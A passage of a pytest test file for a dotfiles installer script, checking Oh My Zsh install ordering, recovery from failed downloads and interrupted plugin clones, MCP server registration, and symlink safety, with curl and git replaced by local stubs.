#      `[ -f "$zdot/.zshrc" ] || [ -h "$zdot/.zshrc" ]`, so a SYMLINK trips it
#      too, and `--unattended` alone does not suppress it -- that flag sets
#      RUNZSH / CHSH / OVERWRITE_CONFIRMATION but leaves KEEP_ZSHRC at its `no`
#      default, which merely makes the clobber silent. Only `--keep-zshrc`
#      stops it.
#
# Simplified deliberately: the real setup_zshrc also writes its template when
# no ~/.zshrc existed at all (the write sits outside the clobber guard). No
# test here reaches that path -- create_symlinks always runs first and leaves
# a symlink behind -- so the stub only models the clobber branch.
#
# Written to curl's `-o` target so fetch_and_run executes it in place of a real
# download; the installer body therefore receives install.sh's own flags in
# "$@" (see fetch_and_run's `sh <tmp> --unattended ...` form).
_OMZ_OFFICIAL_INSTALLER_STUB = r"""
out=""; prev=""
for a in "$@"; do
  [ "$prev" = "-o" ] && out="$a"
  prev="$a"
done
if [ -n "$out" ]; then
  cat > "$out" <<'INSTALLER'
if [ -d "$HOME/.oh-my-zsh" ]; then
  echo "Oh My Zsh already installed (stub)" >&2
  exit 1
fi
mkdir -p "$HOME/.oh-my-zsh"
echo "# stub entry point" > "$HOME/.oh-my-zsh/oh-my-zsh.sh"

keep_zshrc=no
for a in "$@"; do
  [ "$a" = "--keep-zshrc" ] && keep_zshrc=yes
done
# setup_zshrc: -f OR -h, so a symlink counts as "an existing zshrc".
if [ "$keep_zshrc" = no ] && { [ -f "$HOME/.zshrc" ] || [ -h "$HOME/.zshrc" ]; }; then
  mv "$HOME/.zshrc" "$HOME/.zshrc.pre-oh-my-zsh"
  echo "# oh-my-zsh default template (stub)" > "$HOME/.zshrc"
fi
INSTALLER
fi
"""


class TestOhMyZshFreshInstallOrdering:
    """A true first-ever install must not abort under set -eo pipefail.

    create_symlinks must not `mkdir -p "$HOME/.oh-my-zsh/custom/themes"` to
    land the theme symlink: on a machine with no prior Oh My Zsh that would
    create $HOME/.oh-my-zsh as a real directory before Oh My Zsh's own
    installer ever ran. The official installer refuses to run when $ZSH
    already exists, so install_oh_my_zsh's unguarded fetch_and_run call would
    return non-zero and set -eo pipefail would take the whole script down. The
    theme-linking block is therefore its own function (link_oh_my_zsh_theme),
    called from main() only after install_oh_my_zsh.
    """

    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

    def test_fresh_install_succeeds_and_still_links_the_theme(self, shell_env):
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        self._stub_git_clone(shell_env)
        home = shell_env.home
        assert not (home / ".oh-my-zsh").exists()  # genuinely fresh machine

        res = run_sourced(
            "create_symlinks && install_oh_my_zsh && link_oh_my_zsh_theme",
            shell_env.env,
        )
        assert res.returncode == 0, res.stdout + res.stderr

        assert (home / ".oh-my-zsh/oh-my-zsh.sh").is_file()
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()
        assert (
            theme_link.resolve()
            == (REPO_ROOT / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").resolve()
        )

    def test_fresh_install_keeps_the_zshrc_symlink_create_symlinks_just_made(
        self, shell_env
    ):
        """Oh My Zsh must not be allowed to clobber our ~/.zshrc symlink.

        main() runs create_symlinks BEFORE install_oh_my_zsh, so on a genuinely
        fresh machine ~/.zshrc is already a symlink into the checkout by the
        time Oh My Zsh's installer runs. setup_zshrc's guard is `-f OR -h`, so
        it treats that symlink as "an existing zshrc", moves it to
        ~/.zshrc.pre-oh-my-zsh and drops its own template in its place --
        silently, because --unattended suppressed the confirmation prompt
        without setting KEEP_ZSHRC.

        The install would then report success while none of the repo's zsh
        config is live: no aliases, no PATH, no plugin list, no ~/.zsh_secrets
        sourcing, no px-rose-pine theme. Only a second full run repairs it (Oh
        My Zsh short-circuits on oh-my-zsh.sh, create_symlinks relinks), which
        hides the problem.
        """
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        self._stub_git_clone(shell_env)
        home = shell_env.home
        assert not (home / ".oh-my-zsh").exists()  # genuinely fresh machine

        res = run_sourced("create_symlinks && install_oh_my_zsh", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr

        zshrc = home / ".zshrc"
        assert zshrc.is_symlink(), (
            "Oh My Zsh replaced the ~/.zshrc symlink with its own template; "
            "pass --keep-zshrc to its installer"
        )
        assert zshrc.resolve() == (REPO_ROOT / ".zshrc").resolve()
        assert not (home / ".zshrc.pre-oh-my-zsh").exists()

    def test_create_symlinks_alone_does_not_create_oh_my_zsh_dir(self, shell_env):
        # create_symlinks must not touch ~/.oh-my-zsh at all on a fresh
        # machine -- that is entirely link_oh_my_zsh_theme's job, run after
        # install_oh_my_zsh.
        home = shell_env.home
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert not (home / ".oh-my-zsh").exists()


class TestOhMyZshFetchFailureIsRecoverable:
    """A failed Oh My Zsh download must stay recoverable on the next run.

    install_oh_my_zsh warns and continues past a failed fetch_and_run (one
    optional component must not stop the run), but nothing after the failure
    branch may treat $ZSH as if it existed: `mkdir -p ~/.oh-my-zsh/custom`, the
    two plugin clones under it, and the `mkdir -p ~/.oh-my-zsh/custom/themes`
    that main() reaches later via link_oh_my_zsh_theme would each materialise
    $HOME/.oh-my-zsh.

    Oh My Zsh's own installer refuses to run when $ZSH already exists (see
    _OMZ_OFFICIAL_INSTALLER_STUB), so that leftover directory would make the
    failure permanent: every later ./install.sh would reprint the same warning
    and never install. change_shell has meanwhile made zsh the login shell,
    so `source $ZSH/oh-my-zsh.sh` in .zshrc would fail on every login -- no
    theme, no plugins, no completions -- and only `rm -rf ~/.oh-my-zsh`
    would repair it.
    """

    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

    def test_failed_fetch_leaves_nothing_behind_so_a_later_run_installs(
        self, shell_env
    ):
        """Two stages: fail, then retry in the SAME $HOME.

        Stage 2 is the half that matters. Asserting only "mkdir was not
        called" would miss link_oh_my_zsh_theme's own mkdir; asserting that a
        subsequent honest run actually installs Oh My Zsh cannot be satisfied
        by any path that left $ZSH behind.
        """
        self._stub_git_clone(shell_env)
        home = shell_env.home

        # Stage 1: the download fails (transient network / DNS / proxy).
        shell_env.stub("curl", exit_code=1)
        first = run_sourced("install_oh_my_zsh; link_oh_my_zsh_theme", shell_env.env)
        assert first.returncode == 0, first.stdout + first.stderr
        assert "[WARNING]" in first.stdout
        assert not (home / ".oh-my-zsh").exists(), (
            "a failed download left $HOME/.oh-my-zsh behind; Oh My Zsh's "
            "installer refuses to run when $ZSH exists, so no later run can "
            "ever install it"
        )

        # Stage 2: same machine, same $HOME, network back.
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        second = run_sourced("install_oh_my_zsh; link_oh_my_zsh_theme", shell_env.env)
        assert second.returncode == 0, second.stdout + second.stderr
        assert (home / ".oh-my-zsh/oh-my-zsh.sh").is_file(), (
            "the retry did not install Oh My Zsh: the first failure is permanent"
        )
        assert "Oh My Zsh installed" in second.stdout
        assert (home / ".oh-my-zsh/custom/plugins/zsh-autosuggestions").is_dir()
        assert (home / ".oh-my-zsh/custom/plugins/zsh-syntax-highlighting").is_dir()
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()
        assert (
            theme_link.resolve()
            == (REPO_ROOT / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").resolve()
        )

    def test_main_call_order_after_a_failed_fetch_creates_no_oh_my_zsh_dir(
        self, shell_env
    ):
        """main() runs link_oh_my_zsh_theme after install_oh_my_zsh.

        Sequenced with `;`, not `&&`: the theme link must still be attempted
        after the failure (that is main()'s real order), and `&&` would skip
        it and pass for the wrong reason. The AFTER_* markers prove both
        functions actually ran.
        """
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", exit_code=1)
        home = shell_env.home

        res = run_sourced(
            "install_oh_my_zsh; echo AFTER_OMZ; link_oh_my_zsh_theme; echo AFTER_THEME",
            shell_env.env,
        )

        assert res.returncode == 0, res.stdout + res.stderr
        assert "AFTER_OMZ" in res.stdout
        assert "AFTER_THEME" in res.stdout
        assert not (home / ".oh-my-zsh").exists(), (
            "link_oh_my_zsh_theme materialised $HOME/.oh-my-zsh after "
            "install_oh_my_zsh had already failed"
        )

    def test_failed_fetch_clones_no_plugins_and_claims_no_plugin_success(
        self, shell_env
    ):
        # Cloning into $ZSH is one of the ways the directory gets created, and
        # a plugin under a non-existent Oh My Zsh is dead weight either way.
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", exit_code=1)

        res = run_sourced('install_oh_my_zsh; echo "AFTER_OMZ"', shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        # Still the house rule: one optional component must not stop the run.
        assert "AFTER_OMZ" in res.stdout
        assert [c for c in shell_env.calls if c.startswith("git clone")] == []
        assert "zsh plugins installed" not in res.stdout

    def test_half_made_zsh_dir_is_left_alone_and_gains_no_plugins(self, shell_env):
        """A $ZSH directory with no entry point is "not installed" -- and not
        ours to delete.

        This is the state a machine poisoned by an earlier failed fetch is
        already in, and it is also what an installer killed mid-run leaves.
        install_oh_my_zsh must treat it as absent (no plugin clones, no success
        claim) so the next run still sees work to do, while leaving whatever
        the user has under it untouched: recovering by `rm -rf`-ing a
        directory that may hold their own custom/ files is the user's call,
        not the script's.
        """
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", exit_code=1)
        home = shell_env.home
        (home / ".oh-my-zsh/custom").mkdir(parents=True)
        mine = home / ".oh-my-zsh/custom/mine.zsh"
        mine.write_text("# hand-written\n", encoding="utf-8")

        res = run_sourced('install_oh_my_zsh; echo "AFTER_OMZ"', shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "AFTER_OMZ" in res.stdout
        assert "zsh plugins installed" not in res.stdout
        assert [c for c in shell_env.calls if c.startswith("git clone")] == []
        assert mine.read_text(encoding="utf-8") == "# hand-written\n"

    def test_successful_fetch_still_creates_custom_plugins_and_themes(self, shell_env):
        # Happy path: the guards must not skip the work they are guarding when
        # Oh My Zsh really did install.
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        home = shell_env.home

        res = run_sourced("install_oh_my_zsh; link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "zsh plugins installed" in res.stdout
        assert (home / ".oh-my-zsh/custom/plugins/zsh-autosuggestions").is_dir()
        assert (home / ".oh-my-zsh/custom/plugins/zsh-syntax-highlighting").is_dir()
        assert (home / ".oh-my-zsh/custom/themes").is_dir()
        assert not (home / ".oh-my-zsh/custom").is_symlink()

    def test_theme_link_still_runs_when_oh_my_zsh_was_already_installed(
        self, shell_env
    ):
        # The guard keys on the directory, not on this run's outcome: a
        # machine that already had Oh My Zsh must keep getting its theme.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()

    def test_dry_run_theme_preview_is_unchanged_on_a_machine_without_omz(
        self, shell_env
    ):
        # link_oh_my_zsh_theme's guard is deliberately gated on DRY_RUN=0:
        # dry-run writes nothing, so it can never materialise $ZSH, and the
        # preview must keep listing the theme it would link.
        home = shell_env.home

        res = run_sourced("DRY_RUN=1 link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "[DRY-RUN] would link" in res.stdout
        assert "px-rose-pine.zsh-theme" in res.stdout
        assert not (home / ".oh-my-zsh").exists()


class TestInterruptedCloneIsRetried:
    """A hard-interrupted `git clone` must not wedge every later run.

    install.sh clones three plugins -- tpm, zsh-autosuggestions,
    zsh-syntax-highlighting -- whose guards must not test the TARGET DIRECTORY.
    An ordinary clone failure (bad URL, no DNS) is invisible to such a guard,
    because git removes the directory it created on its way out. A HARD
    interrupt is not: SIGKILL, an OOM kill, or the laptop suspending mid-fetch
    leaves the target behind holding nothing but the half-written `.git` that
    git lays down first.

    A `[ -d ... ]` guard would then report "already installed" and never retry
    the clone, while `.tmux.conf`'s `run '~/.tmux/plugins/tpm/tpm'` and
    .zshrc's plugin list kept sourcing files that were never fetched. Only a
    manual `rm -rf` would repair it -- the same shape install_oh_my_zsh avoids
    by keying its guard on the ENTRY POINT instead.

    The load-bearing assertion here is that the entry point EXISTS after the
    run, not merely that `git clone` was called: a guard-only fix still calls
    clone, git refuses the non-empty directory (exit 128), and for tpm
    try_install swallows that into a tidy warning -- leaving the machine just
    as wedged with a greener-looking log.
    """

    TPM = ".tmux/plugins/tpm"
    AUTOSUGGESTIONS = ".oh-my-zsh/custom/plugins/zsh-autosuggestions"
    SYNTAX = ".oh-my-zsh/custom/plugins/zsh-syntax-highlighting"

    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

    def _mark_omz_installed(self, home):
        # The zsh plugin clones sit behind install_oh_my_zsh's own entry-point
        # guard; short-circuit the download the way a machine that already has
        # Oh My Zsh would, so these tests cover the plugin clones only.
        omz = home / ".oh-my-zsh"
        omz.mkdir(parents=True, exist_ok=True)
        (omz / "oh-my-zsh.sh").write_text("# stub entry point\n", encoding="utf-8")

    def _interrupted_clone(self, path: Path) -> Path:
        """The exact on-disk state a SIGKILLed `git clone` leaves behind."""
        git_dir = path / ".git"
        (git_dir / "objects").mkdir(parents=True)
        (git_dir / "config").write_text("[core]\n", encoding="utf-8")
        assert [e.name for e in path.iterdir()] == [".git"]
        return path

    def _healthy_checkout(self, path: Path, entry_point: str) -> Path:
        (path / ".git" / "objects").mkdir(parents=True)
        (path / entry_point).write_text("# plugin\n", encoding="utf-8")
        (path / "README.md").write_text("# upstream\n", encoding="utf-8")
        return path

    def _clone_calls(self, shell_env):
        return [c for c in shell_env.calls if c.startswith("git clone")]

    # --- the wedge itself ---------------------------------------------------

    def test_interrupted_tpm_clone_is_retried_instead_of_reported_installed(
        self, shell_env
    ):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "tpm already installed" not in res.stdout, (
            "a directory holding only .git was read as an installed tpm"
        )
        assert (home / self.TPM / "tpm").is_file(), (
            "tpm was never re-cloned: .tmux.conf's `run '~/.tmux/plugins/tpm/tpm'` "
            "stays broken on every tmux start until the directory is removed by hand"
        )
        assert len(self._clone_calls(shell_env)) == 1

    @pytest.mark.parametrize(
        "plugin",
        ["zsh-autosuggestions", "zsh-syntax-highlighting"],
    )
    def test_interrupted_zsh_plugin_clone_is_retried(self, shell_env, plugin):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)
        target = home / ".oh-my-zsh/custom/plugins" / plugin
        target.mkdir(parents=True)
        self._interrupted_clone(target)

        res = run_sourced("install_oh_my_zsh", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (target / f"{plugin}.zsh").is_file(), (
            f"{plugin} was never re-cloned: every interactive shell keeps "
            "starting without it"
        )

    def test_repaired_clone_is_not_repeated_on_the_next_run(self, shell_env):
        # The repair must land in a state the guard then recognises, or the
        # fix trades a permanent skip for a permanent re-clone.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)

        first = run_sourced("install_tmux_plugins", shell_env.env)
        assert first.returncode == 0, first.stdout + first.stderr
        assert len(self._clone_calls(shell_env)) == 1

        second = run_sourced("install_tmux_plugins", shell_env.env)
        assert second.returncode == 0, second.stdout + second.stderr
        assert "tpm already installed" in second.stdout
        assert len(self._clone_calls(shell_env)) == 1

    def test_empty_leftover_directory_needs_no_removal_to_be_cloned_into(
        self, shell_env
    ):
        # `git clone` accepts an existing EMPTY directory, so this case must
        # reach the clone without deleting anything -- it is also the state a
        # repair leaves behind when the retry itself then fails.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (home / self.TPM / "tpm").is_file()

    # --- what the repair must never touch -----------------------------------

    def test_healthy_tpm_checkout_is_skipped_and_left_intact(self, shell_env):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._healthy_checkout(home / self.TPM, "tpm")

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "tpm already installed" in res.stdout
        assert self._clone_calls(shell_env) == []
        assert (home / self.TPM / ".git").is_dir(), "a healthy checkout was gutted"
        assert (home / self.TPM / "README.md").is_file()

    @pytest.mark.parametrize(
        "plugin",
        ["zsh-autosuggestions", "zsh-syntax-highlighting"],
    )
    def test_healthy_zsh_plugin_checkout_is_skipped_and_left_intact(
        self, shell_env, plugin
    ):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)
        target = home / ".oh-my-zsh/custom/plugins" / plugin
        target.mkdir(parents=True)
        self._healthy_checkout(target, f"{plugin}.zsh")

        res = run_sourced("install_oh_my_zsh", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        # Only this plugin's clone must be skipped -- the sibling plugin is
        # genuinely absent here and is expected to be cloned.
        assert [c for c in self._clone_calls(shell_env) if plugin in c] == []
        assert (target / ".git").is_dir()
        assert (target / "README.md").is_file()

    def test_populated_but_broken_directory_is_reported_never_deleted(self, shell_env):
        """Files under the target mean it is not an interrupted clone.

        A checkout that lost only its entry point, or a directory the user
        put something of their own into, is out of scope for an automatic
        repair -- install_oh_my_zsh takes the same stance on an
        already-populated $ZSH. It must still be SAID out loud, because
        silence is the failure this guards against.
        """
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)
        mine = home / self.TPM / "notes.txt"
        mine.write_text("mine\n", encoding="utf-8")

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert mine.read_text(encoding="utf-8") == "mine\n"
        assert (home / self.TPM / ".git").is_dir()
        assert "[WARNING]" in res.stdout
        assert self._clone_calls(shell_env) == []

    def test_symlinked_target_is_not_followed(self, shell_env, tmp_path):
        # `-d` reports true THROUGH a symlink, so an unguarded repair would
        # empty whatever is on the far end -- a path the user chose, outside
        # the plugin directory entirely.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        elsewhere = tmp_path / "my-own-tpm"
        elsewhere.mkdir()
        self._interrupted_clone(elsewhere)
        (home / ".tmux/plugins").mkdir(parents=True)
        (home / self.TPM).symlink_to(elsewhere)

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (elsewhere / ".git").is_dir(), "the repair reached through a symlink"
        assert (home / self.TPM).is_symlink()
        assert "[WARNING]" in res.stdout
        assert self._clone_calls(shell_env) == []

    def test_a_target_outside_home_is_refused(self, shell_env, tmp_path):
        # Containment. Every caller passes a literal plugin path under $HOME;
        # the helper asserts that rather than trusting it, so no future caller
        # can aim the `rm -rf` at anything outside those directories. Called
        # directly because no caller can reach this branch today -- which is
        # the point of pinning it now.
        outside = tmp_path / "outside-home"
        outside.mkdir()
        self._interrupted_clone(outside)

        res = run_sourced(
            f'rc=0; reclaim_aborted_clone "{outside}" demo || rc=$?; echo "RC=$rc"',
            shell_env.env,
        )

        assert res.returncode == 0, res.stdout + res.stderr
        assert "RC=1" in res.stdout
        assert "[WARNING]" in res.stdout
        assert (outside / ".git").is_dir(), "the rm reached outside $HOME"

    def test_dry_run_removes_nothing_and_clones_nothing(self, shell_env):
        # main() never reaches install_tmux_plugins in dry-run today, but an
        # `rm -rf` that a single refactor could expose to a preview run is
        # worth pinning down rather than arguing about.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)

        res = run_sourced("DRY_RUN=1 install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (home / self.TPM / ".git").is_dir()
        assert self._clone_calls(shell_env) == []


class TestRegisterClaudeMcpServers:
    def test_gemini_consultant_uses_resolved_python3(self, shell_env):
        # `claude mcp get NAME` must fail so add_mcp proceeds to register.
        shell_env.stub("claude", body='[ "$1" = "mcp" ] && [ "$2" = "get" ] && exit 1')
        shell_env.stub("python3")

        res = run_sourced("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        add_calls = [c for c in shell_env.calls if c.startswith("claude mcp add")]
        gemini_calls = [c for c in add_calls if "gemini-consultant" in c]
        assert len(gemini_calls) == 1, add_calls

        python3_path = str(shell_env.stub_bin / "python3")
        assert f"-- {python3_path} " in gemini_calls[0]

    def test_gemini_consultant_is_pinned_to_the_concrete_interpreter(self, shell_env):
        # Under pyenv `command -v python3` is the shim, which picks the
        # interpreter from the cwd's .python-version when Claude Code starts
        # the server -- a project pinned to another version has no `mcp`
        # there and the server never starts. Register the interpreter the shim
        # resolves to right now (sys.executable), the one pip installed into.
        shell_env.stub("claude", body='[ "$1" = "mcp" ] && [ "$2" = "get" ] && exit 1')
        real = shell_env.stub("python3.13-real")
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{real}"')

        res = run_sourced("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        gemini_calls = [
            c
            for c in shell_env.calls
            if c.startswith("claude mcp add") and "gemini-consultant" in c
        ]
        assert len(gemini_calls) == 1, shell_env.calls
        assert f"-- {real} " in gemini_calls[0], gemini_calls[0]

    def test_a_non_executable_sys_executable_falls_back(self, shell_env, tmp_path):
        shell_env.stub("claude", body='[ "$1" = "mcp" ] && [ "$2" = "get" ] && exit 1')
        ghost = tmp_path / "no-such-python"
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{ghost}"')

        res = run_sourced("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        gemini = [c for c in shell_env.calls if "mcp add" in c and "gemini" in c]
        assert len(gemini) == 1, shell_env.calls
        assert f"-- {shell_env.stub_bin / 'python3'} " in gemini[0], gemini[0]

    def test_an_interpreter_that_cannot_import_mcp_is_warned_about(self, shell_env):
        shell_env.stub("claude", body='[ "$1" = "mcp" ] && [ "$2" = "get" ] && exit 1')
        real = shell_env.stub(
            "python3.13-real",
            body='case "$2" in *"import mcp"*) exit 1 ;; esac',
        )
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{real}"')

        res, failures = run_recording("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        assert any(
            "[WARNING]" in ln and "mcp" in ln and str(real) in ln
            for ln in res.stdout.splitlines()
        ), res.stdout
        # Recorded, so main() does not end with "Installation completed!" while
        # the server cannot start.
        assert failures == ["gemini-consultant (mcp not importable)"], failures

    def test_an_interpreter_that_imports_mcp_gets_no_warning(self, shell_env):
        shell_env.stub("claude", body='[ "$1" = "mcp" ] && [ "$2" = "get" ] && exit 1')
        real = shell_env.stub("python3.13-real")
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{real}"')

        res, failures = run_recording("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        assert "cannot import" not in res.stdout, res.stdout
        assert failures == [], failures

    def test_a_registration_with_another_interpreter_is_re_pinned(self, shell_env):
        # An older run registered the pyenv shim; a rerun converges on the
        # concrete interpreter instead of only printing how to re-pin it.
        real = shell_env.stub("python3.13-real")
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{real}"')
        shell_env.stub(
            "claude",
            body=_claude_stub(
                _registered(
                    shell_env.home,
                    str(real),
                    gemini_consultant={"command": "/old/shims/python3"},
                )
            ),
        )

        res, failures = run_recording("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        gemini = [
            c for c in shell_env.calls if c.startswith("claude mcp") and "gemini" in c
        ]
        assert gemini[-2:] == [
            "claude mcp remove --scope user gemini-consultant",
            f"claude mcp add --scope user gemini-consultant -- {real} "
            f"{shell_env.home}/.claude/mcp-servers/gemini-consultant/server.py",
        ], gemini
        assert failures == [], failures

    def test_a_registration_with_the_same_interpreter_is_kept(self, shell_env):
        real = shell_env.stub("python3.13-real")
        shell_env.stub("python3", body=f'[ "$1" = "-c" ] && echo "{real}"')
        shell_env.stub(
            "claude", body=_claude_stub(_registered(shell_env.home, str(real)))
        )

        res = run_sourced("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        assert not [
            c for c in shell_env.calls if re.match(r"claude mcp (add|remove)", c)
        ]
        assert "MCP server 'gemini-consultant' already registered" in res.stdout

    def test_codex_is_not_registered_as_an_mcp_server(self, shell_env):
        # Codex CLI 0.154 removed its MCP-server mode: the registration only
        # produced a server that fails with CONNECTION_CLOSED on every start.
        # Codex is reached through `codex exec` (codex-consultation skill).
        shell_env.stub("claude", body='[ "$1" = "mcp" ] && [ "$2" = "get" ] && exit 1')
        shell_env.stub("python3")

        res = run_sourced("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        add_calls = [c for c in shell_env.calls if c.startswith("claude mcp add")]
        assert add_calls, "the other servers must still be registered"
        assert not [c for c in add_calls if " codex " in f"{c} "], add_calls


class TestOptionalInstallerFailures:
    """A transient brew/network/apt failure in one optional installer must
    warn and move on -- never abort the whole installer via `set -e`."""

    def test_wezterm_brew_failure_does_not_abort_script_macos(self, shell_env):
        shell_env.stub("brew", exit_code=1)
        res = run_sourced(
            'OS=macos install_wezterm; echo "AFTER_WEZTERM"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_WEZTERM" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_fonts_brew_failure_does_not_abort_script_macos(self, shell_env):
        shell_env.stub("brew", exit_code=1)
        res = run_sourced(
            'OS=macos install_fonts; echo "AFTER_FONTS"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_FONTS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_wezterm_curl_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("curl", exit_code=1)
        shell_env.stub("sudo")
        res = run_sourced(
            "command_exists() { return 1; }; "
            'OS=ubuntu install_wezterm; echo "AFTER_WEZTERM"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_WEZTERM" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_gh_curl_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("curl", exit_code=1)
        shell_env.stub("sudo")
        res = run_sourced(
            'command_exists() { return 1; }; OS=ubuntu install_gh; echo "AFTER_GH"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_GH" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_fonts_apt_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("sudo", exit_code=1)
        res = run_sourced(
            'OS=ubuntu install_fonts; echo "AFTER_FONTS"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_FONTS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_oh_my_zsh_download_failure_does_not_abort_script(self, shell_env):
        # An unguarded fetch_and_run for the Oh My Zsh installer download
        # would, under `set -eo pipefail`, abort main() outright on a transient
        # network failure, so everything after it (vim-plug, tmux plugins,
        # Neovim setup, AI tools, MCP registration, the theme symlink and the
        # shell change) would silently never run.
        shell_env.stub("git")
        res = run_sourced(
            'fetch_and_run() { return 1; }; install_oh_my_zsh; echo "AFTER_OMZ"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_OMZ" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_oh_my_zsh_download_failure_does_not_claim_success(self, shell_env):
        shell_env.stub("git")
        res = run_sourced(
            "fetch_and_run() { return 1; }; install_oh_my_zsh",
            shell_env.env,
        )
        assert "Oh My Zsh installed" not in res.stdout


class TestAptAliasSymlinks:
    """Debian ships bat/fd as batcat/fdfind, so install_apt_packages drops
    PATH-visible aliases into ~/.local/bin. Those two `ln -sf` calls are the
    only links in the script that skip create_symlinks' backup step --
    link_debian_alias hand-rolls its own guard instead of calling
    `backup_if_real` (these are generated aliases, not dotfiles worth backing
    up into $backup_dir). Without that guard a real user binary at that path
    would be destroyed with no backup and no warning."""

    def _prepare(self, shell_env):
        shell_env.stub("batcat")
        shell_env.stub("fdfind")
        # install_apt_packages ends with check_neovim_version, which reads the
        # HOST's nvim unless one is stubbed: an old or absent nvim on the
        # machine running the tests would add a [WARNING] of its own to every
        # run here. A current stub keeps the output about what these tests
        # are about (see TestNeovimVersionCheck for the check itself).
        shell_env.stub("nvim", body="echo 'NVIM v0.12.4'")
        local_bin = shell_env.home / ".local" / "bin"
        local_bin.mkdir(parents=True, exist_ok=True)
        return local_bin

    def test_real_user_binary_is_never_replaced(self, shell_env):
        local_bin = self._prepare(shell_env)
        mine = local_bin / "fd"
        mine.write_text("#!/bin/sh\necho MINE\n", encoding="utf-8")

        res = run_sourced("install_apt_packages", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert not mine.is_symlink(), "a real user binary must not become a symlink"
        assert "MINE" in mine.read_text(encoding="utf-8")
        # The guard's OWN warning, by name: a bare "[WARNING]" would also be
        # satisfied by any unrelated warning the step prints.
        assert any(
            "[WARNING]" in ln and "is not a symlink" in ln and "fd" in ln
            for ln in res.stdout.splitlines()
